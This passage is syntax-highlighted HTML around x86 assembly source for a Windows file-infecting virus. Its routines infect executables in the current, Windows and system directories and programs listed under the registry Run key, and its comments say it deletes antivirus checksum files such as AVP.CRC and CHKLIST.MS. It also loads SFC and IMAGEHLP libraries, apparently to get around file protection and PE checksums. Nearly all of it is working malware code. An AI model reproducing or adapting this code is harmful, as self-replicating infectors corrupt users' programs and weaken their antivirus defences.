</span><span class="sc5">My_ExitProcess</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">     </span><span class="sc1">; Patch ExitProcess just in case the applica-</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">LastFunction</span><span class="sc0"> </span><span class="sc1">; tion calls it without making an</span><span class="sc0">
</span><span class="sc5">My_ExitProcess</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">                </span><span class="sc1">; explicit call (and thus it can't</span><span class="sc0">
                                            </span><span class="sc1">; be patched)</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;; RUN-TIME INFECTION</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; This will infect one file of each four in the current, windows and system</span><span class="sc0">
</span><span class="sc1">;; directory (as always). If the files AVP.CRC, ANTI-VIR.DAT, CHKLIST.MS or</span><span class="sc0">
</span><span class="sc1">;; IVB.NTZ are found, they'll be deleted. </span><span class="sc0">
</span><span class="sc5">RuntimeInfection</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadSFCFunctions</span><span class="sc0"> </span><span class="sc1">; Load SFC.DLL library</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadIMAGEHLPFunctions</span><span class="sc0"> </span><span class="sc1">; Load IMAGEHLP.DLL library</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegistryFunctions</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoRegistry</span><span class="sc0">

                </span><span class="sc1">;;; Infectar directamente varios paths</span><span class="sc0">
                </span><span class="sc1">;;; de programas instalados</span><span class="sc0">
</span><span class="sc1">; HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\
; \WinZip</span><span class="sc0">
</span><span class="sc1">; HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SubkeyIndex</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RunKeyEnd</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleOpenedKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">KEY_ALL_ACCESS</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RunKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_RegOpenKeyExA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@EndOfKeys</span><span class="sc0">
      </span><span class="sc5">@@LoopSubkeys</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LongBuffer</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Directory2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LongBuffer2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Directory1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SubkeyIndex</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleOpenedKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_RegEnumValueA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Error?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@EndOfKeys</span><span class="sc0"> </span><span class="sc1">; Exit, then</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Directory2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
          </span><span class="sc5">@@LoopSearchExtension</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NextSubkey</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NextSubkey</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ToLower</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'exe.'</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopSearchExtension</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NameOK</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopSearchExtension</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc5">@@NameOK</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Directory2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectDirectly</span><span class="sc0">

       </span><span class="sc5">@@NextSubkey</span><span class="sc4">:</span><span class="sc0">               
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SubkeyIndex</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LoopSubkeys</span><span class="sc0">

    </span><span class="sc5">@@EndOfKeys2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleOpenedKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_RegCloseKey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">@@EndOfKeys</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleADVAPI32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_FreeLibrary</span><span class="sc4">]</span><span class="sc0">

     </span><span class="sc5">@@NoRegistry</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectCurrentDir</span><span class="sc0"> </span><span class="sc1">; Self-explanatory ;)</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Directory2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Save the</span><span class="sc0">
                                         </span><span class="sc1">; current directory</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectWindowsDir</span><span class="sc0"> </span><span class="sc1">; Infect the Win dir</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectSystemDir</span><span class="sc0">  </span><span class="sc1">; Infect windows\system dir</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Directory2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Restore the current dir</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleSFC</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Next1</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleSFC</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_FreeLibrary</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc5">@@Next1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleIMAGEHLP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Next2</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleIMAGEHLP</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_FreeLibrary</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc5">@@Next2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleSFC</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleIMAGEHLP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_CheckSumMappedFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SfcIsFileProtected</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                      </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">RuntimeInfection</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">RunKey</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc13">'Software\Microsoft\Windows\CurrentVersion\Run\'
</span><span class="sc5">RunKeyEnd</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">Directory1</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; Place to get the windows, etc. dirs</span><span class="sc0">
</span><span class="sc5">Directory2</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; Place to save the current directory</span><span class="sc0">

</span><span class="sc5">LoadRegistryFunctions</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RegistryDLL</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_LoadLibraryA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Error?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return</span><span class="sc0">          </span><span class="sc1">; Exit, then</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleADVAPI32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Save handle</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ASC_RegistryFunctions</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Names of functions</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_RegistryFunctions</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Storage of RVAs</span><span class="sc0">
    </span><span class="sc5">@@NextRVA</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleADVAPI32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetProcAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the address</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; Error?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return</span><span class="sc0">                </span><span class="sc1">; Exit, then</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Save RVA</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc5">@@LoopNextFunc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; Next char</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; End of name?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopNextFunc</span><span class="sc0">       </span><span class="sc1">; If not, continue increasing</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; Jump over the 0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Another 0?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextRVA</span><span class="sc0">            </span><span class="sc1">; If not, continue getting names</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">@@Return</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">LoadRegistryFunctions</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">InfectSystemDir</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetSystemDirectoryA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Common_InfectDir</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; EBX=RVA of GetSystemDirectory</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Directory1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">; GetSystemDirectory or GetWindowsDirectory</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; If error, end</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetDirectory1</span><span class="sc0"> </span><span class="sc1">; Set that directory</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectCurrentDir</span><span class="sc0"> </span><span class="sc1">; Infect the directory files</span><span class="sc0">
</span><span class="sc5">@@Return</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">InfectSystemDir</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">InfectWindowsDir</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetWindowsDirectoryA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Common_InfectDir</span><span class="sc0">  </span><span class="sc1">; EBX=RVA of GetWindowsDirectory</span><span class="sc0">
</span><span class="sc5">InfectWindowsDir</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                     </span><span class="sc1">; Jump to the common part of this</span><span class="sc0">
                                          </span><span class="sc1">; function and the InfectSystemDir</span><span class="sc0">
                
</span><span class="sc5">SetDirectory1</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
